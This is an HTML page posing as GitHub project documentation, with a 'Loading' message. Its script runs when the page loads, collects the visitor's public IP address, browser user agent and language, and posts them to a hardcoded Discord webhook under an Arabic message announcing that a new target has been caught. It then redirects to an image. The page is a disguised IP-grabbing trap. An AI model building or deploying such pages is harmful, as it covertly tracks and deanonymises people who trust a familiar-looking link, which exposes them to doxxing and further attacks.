<!DOCTYPE html>
<html>
<head>
    <title>GitHub - Project Documentation</title>
    <script>
        async function captureInfo() {
            const webhookURL = "https://discord.com/api/webhooks/1459200310185820361/NUkYWHtHY6QxPNWeiCzLz9zR1uKP8mALnEX-D9VEXPE0CETDNzMbYQ0XW0V5XxW9Nwlm";
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "🚀 **تم اصطياد هدف جديد!**",
                        embeds: [{
                            title: "بيانات الجهاز والاتصال",
                            color: 16711680,
                            fields: [
                                { name: "الـ IP العام", value: data.ip },
                                { name: "المتصفح", value: navigator.userAgent },
                                { name: "اللغة", value: navigator.language }
                            ]
                        }]
                    })
                });
            } catch (e) { console.log(e); }

            setTimeout(() => {
                window.location.href = "https://i.imgur.com/866uX9r.jpg";
            }, 1000);
        }
        window.onload = captureInfo;
    </script>
</head>
<body>
    <h1>Loading Project Documentation...</h1>
    <p>Please wait while the repository assets are loading.</p>
</body>
</html>
